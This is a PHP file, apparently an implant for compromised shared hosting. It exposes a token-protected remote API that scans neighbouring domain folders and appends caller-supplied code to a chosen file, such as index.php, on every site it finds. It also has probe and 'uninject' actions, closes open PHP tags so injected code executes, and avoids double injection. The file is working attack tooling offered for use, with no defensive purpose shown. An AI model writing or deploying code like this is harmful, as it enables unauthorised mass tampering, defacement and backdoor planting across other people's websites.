<?php
// api.php – Remote write / inject/uninject API (SNIPPET ONLY, add closing tag if missing, avoid double-inject)
declare(strict_types=1);

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization, Accept');
header('Access-Control-Max-Age: 600');
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }

// ----------------- CONFIG -----------------
$API_TOKEN = '123asdasd123123asd';
$ALLOWED_TLDS = ['.com','.net','.org','.id','.io','.xyz','.online','.site','.info','.dev','.store','.tech','.blog'];
$ALLOWED_ACTIONS = ['probe','inject','uninject'];
$MAX_SCAN_DEPTH = 6;
$MAX_SCAN_DIRS = 15000;

// ----------------- HELPERS -----------------
function respond_json(int $code, array $payload): void {
    http_response_code($code);
    echo json_encode($payload, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    exit;
}

function get_bearer_token(): ?string {
    $hdr = $_SERVER['HTTP_AUTHORIZATION'] ?? ($_SERVER['REDIRECT_HTTP_AUTHORIZATION'] ?? '');
    if (!$hdr) return null;
    if (preg_match('/Bearer\s+(\S+)/i', $hdr, $m)) return $m[1];
    return null;
}

function is_domain_folder(string $name, array $tlds): bool {
    $dn = strtolower($name);
    if (strpos($dn, '.') === false) return false;
    foreach ($tlds as $t) if (substr($dn, -strlen($t)) === strtolower($t)) return true;
    return false;
}

function is_excluded(string $folder, array $excludes): bool {
    $f = strtolower($folder);
    foreach ($excludes as $ex) {
        $ex = strtolower(trim($ex));
        if ($ex === '') continue;
        if (strpos($f, $ex) !== false) return true;
    }
    return false;
}

function scan_dirs_bfs(array $roots, int $maxDepth = 6, int $maxDirs = 15000): array {
    $res = []; $queue = []; $visited = []; $scanned = 0;
    foreach ($roots as $r) { $rr = realpath($r); if ($rr) $queue[] = ['p' => $rr, 'd' => 0]; }
    while (!empty($queue) && $scanned < $maxDirs) {
        $it = array_shift($queue); $p = $it['p']; $d = $it['d'];
        if (isset($visited[$p])) continue; $visited[$p] = 1; if (!is_dir($p)) continue;
        $res[] = $p; $scanned++; if ($d >= $maxDepth) continue;
        $ch = @scandir($p); if (!is_array($ch)) continue;
        foreach ($ch as $c) { if ($c === '.' || $c === '..') continue; $child = $p . DIRECTORY_SEPARATOR . $c; if (is_dir($child) && !isset($visited[$child])) $queue[] = ['p' => $child, 'd' => $d + 1]; }
    }
    return $res;
}

function detect_webroot_auto(string $startDir, array $allowedTlds, int $maxUp = 12) {
    $cur = realpath($startDir); if ($cur === false) return false; $level = 0;
    while ($cur !== false && $level <= $maxUp) {
        $children = @scandir($cur); if (is_array($children)) {
            foreach ($children as $c) {
                if ($c === '.' || $c === '..') continue;
                $p = $cur . DIRECTORY_SEPARATOR . $c;
                if (is_dir($p) && is_domain_folder($c, $allowedTlds)) return realpath($p);
            }
        }
        $parent = dirname($cur); if ($parent === $cur) break; $cur = $parent; $level++;
    }
    return realpath(dirname($startDir));
}

function detect_domain_webroot(string $domainPath, string $target_filename, int $maxDepth = 4) {
    $queue = [['path' => realpath($domainPath), 'depth' => 0]]; $visited = [];
    while (!empty($queue)) {
        $it = array_shift($queue);
        $cur = $it['path']; $d = $it['depth'];
        if (!$cur || isset($visited[$cur])) continue; $visited[$cur] = 1;

        $targetPath = $cur . DIRECTORY_SEPARATOR . $target_filename;
        if (file_exists($targetPath)) return $targetPath;

        if ($d >= $maxDepth) continue;
        $children = @scandir($cur); if (!is_array($children)) continue;
        foreach ($children as $c) { if ($c === '.' || $c === '..') continue; $child = $cur . DIRECTORY_SEPARATOR . $c; if (is_dir($child)) $queue[] = ['path' => $child, 'depth' => $d + 1]; }
    }
    return false;
}

// ----------------- AUTH -----------------
$token = get_bearer_token();
if (!$token) respond_json(401, ['status' => 'error', 'message' => 'Missing Authorization: Bearer <token>']);
if (!hash_equals($API_TOKEN, $token)) respond_json(403, ['status' => 'error', 'message' => 'Invalid token']);

// ----------------- INPUT -----------------
$raw = file_get_contents('php://input');
$input = json_decode($raw, true); if (!is_array($input)) $input = [];
$action = $input['action'] ?? '';
$target_filename = $input['target_filename'] ?? '';
$script = isset($input['script']) ? (string)$input['script'] : '';
$excludes = isset($input['excludes']) && is_array($input['excludes']) ? array_values(array_filter(array_map('strval', $input['excludes']))) : [];
$excludes = array_map('trim', $excludes);
if (!in_array($action, $ALLOWED_ACTIONS, true)) respond_json(400, ['status' => 'error', 'message' => 'Invalid action']);

// ----------------- DETERMINE ROOTS -----------------
$apiDir = realpath(__DIR__);
$webroot = detect_webroot_auto($apiDir, $ALLOWED_TLDS);
if ($webroot === false) respond_json(500, ['status' => 'error', 'message' => 'Unable to detect webroot']);
$roots = [$webroot, dirname($webroot), $apiDir];
$roots = array_values(array_unique(array_map(function($p){return realpath($p)?:$p;},$roots)));

// ----------------- ACTION: probe -----------------
if ($action === 'probe') {
    $dirs = scan_dirs_bfs($roots, $MAX_SCAN_DEPTH, $MAX_SCAN_DIRS);
    $discovered = [];
    foreach ($dirs as $d) {
        $base = basename($d);
        if (!is_domain_folder($base, $ALLOWED_TLDS)) continue;
        if (is_excluded($base, $excludes)) continue;
        $discovered[] = ['name' => $base, 'path' => $d, 'suggested_targets' => [$d . DIRECTORY_SEPARATOR . $target_filename]];
    }
    respond_json(200, [
        'status' => 'ok', 'action' => 'probe',
        'summary' => ['webroot' => $webroot, 'scan_roots' => $roots, 'scanned_dirs' => count($dirs), 'discovered_count' => count($discovered)],
        'data' => ['discovered' => $discovered]
    ]);
}

// ----------------- ACTION: inject / uninject -----------------
if (in_array($action, ['inject', 'uninject'])) {
    if (!$target_filename) respond_json(400, ['status' => 'error', 'message' => 'target_filename required']);
    $dirs = scan_dirs_bfs($roots, $MAX_SCAN_DEPTH, $MAX_SCAN_DIRS);
    $candidates = [];
    foreach ($dirs as $d) {
        $base = basename($d);
        if (!is_domain_folder($base, $ALLOWED_TLDS)) continue;
        if (is_excluded($base, $excludes)) continue;
        $candidates[] = ['name' => $base, 'path' => $d];
    }
    if (empty($candidates)) respond_json(200, ['status' => 'skipped', 'action' => $action, 'summary' => ['targets' => 0], 'data' => ['results' => []]]);

    $results = [];
    foreach ($candidates as $c) {
        $base = $c['name'];
        $targetFile = detect_domain_webroot($c['path'], $target_filename);
        if (!$targetFile) { $results[] = ['domain' => $base, 'target' => $c['path'] . '/' . $target_filename, 'reason' => 'file_not_found']; continue; }

        try {
            $original = file_exists($targetFile) ? @file_get_contents($targetFile) : '';

            if ($action === 'inject') {
                // snippet must not be empty
                if ($script === '') {
                    $results[] = ['domain' => $base, 'target' => $targetFile, 'reason' => 'empty_snippet'];
                    continue;
                }

                // If snippet already exists exactly in file, skip to avoid double-inject
                if (strpos($original, $script) !== false) {
                    $results[] = ['domain' => $base, 'target' => $targetFile, 'reason' => 'already_injected'];
                    continue;
                }

                // if file has NO closing PHP tag anywhere, add one before injecting to avoid syntax error
                if (strpos($original, '?>') === false) {
                    // append closing tag, then the snippet
                    $new = $original . "\n?>\n" . $script . "\n";
                } else {
                    // file already has closing tag(s) — just append snippet at end
                    $new = $original . "\n" . $script . "\n";
                }

                // write with exclusive lock to reduce race conditions
                @file_put_contents($targetFile, $new, LOCK_EX);
                $results[] = ['domain' => $base, 'target' => $targetFile, 'note' => 'injected_real'];
            } else { // uninject: remove first exact occurrence of the snippet (if found)
                if ($script === '') {
                    $results[] = ['domain' => $base, 'target' => $targetFile, 'reason' => 'empty_snippet'];
                    continue;
                }
                if (strpos($original, $script) !== false) {
                    // remove first occurrence only (preserve others)
                    $pattern = '/' . preg_quote($script, '/') . '/s';
                    $new = preg_replace($pattern, '', $original, 1);
                    @file_put_contents($targetFile, $new, LOCK_EX);
                    $results[] = ['domain' => $base, 'target' => $targetFile, 'note' => 'uninjected_real'];
                } else {
                    $results[] = ['domain' => $base, 'target' => $targetFile, 'reason' => 'snippet_not_found'];
                }
            }
        } catch (\Throwable $e) {
            $results[] = ['domain' => $base, 'target' => $targetFile, 'error' => $e->getMessage()];
        }
    }

    $summary = ['webroot' => $webroot, 'scan_roots' => $roots, 'candidates' => count($candidates)];
    respond_json(200, ['status' => 'real', 'action' => $action, 'summary' => $summary, 'data' => ['results' => $results]]);
}

respond_json(400, ['status' => 'error', 'message' => 'Unhandled case']);
